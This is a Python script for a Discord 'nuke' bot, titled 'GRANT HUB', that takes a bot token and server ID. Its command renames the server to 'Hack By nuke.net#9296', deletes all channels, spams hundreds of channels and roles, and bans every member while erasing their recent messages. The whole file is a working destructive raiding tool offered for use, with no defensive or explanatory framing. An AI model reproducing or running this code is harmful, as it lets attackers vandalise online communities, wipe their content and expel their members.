print("		                                                                      ")
print("░██████╗░██████╗░░█████╗░███╗░░██╗████████╗  ██╗░░██╗██╗░░░██╗██████╗░")
print("██╔════╝░██╔══██╗██╔══██╗████╗░██║╚══██╔══╝  ██║░░██║██║░░░██║██╔══██╗")
print("██║░░██╗░██████╔╝███████║██╔██╗██║░░░██║░░░  ███████║██║░░░██║██████╦╝")
print("██║░░╚██╗██╔══██╗██╔══██║██║╚████║░░░██║░░░  ██╔══██║██║░░░██║██╔══██╗")
print("╚██████╔╝██║░░██║██║░░██║██║░╚███║░░░██║░░░  ██║░░██║╚██████╔╝██████╦╝")
print("░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝░░░╚═╝░░░  ╚═╝░░╚═╝░╚═════╝░╚═════╝░")
token = input("Bot token:")
serverid = input("Server Id:")
import discord
from discord.ext import commands
from discord.utils import get
client = discord.Client()
name = "Hack By nuke.net#9296"
names = name
bot = commands.Bot(command_prefix="G|", cas_insentive=True, help_command=None)
text = "createchanel " + name + " in " + serverid
textr = "createrole " + name + " in " + serverid
@bot.command()
async def nuke(ctx):
    await ctx.guild.edit(name=name)
    for c in ctx.guild.channels:
        await c.delete() 
    guild = ctx.message.guild
    for i in range(1, 500):
        print(text)
        channels = await guild.create_text_channel(name) 
    for i in range(1, 500):
        print(textr)
        await guild.create_role(name=names)
    for member in list(ctx.guild.members):
      try:
        await member.ban(reason=name, delete_message_days=7)
        print(f"Banned {member.display_name}!" + "in" + serverid)
      except Exception:
        pass
bot.run(token)
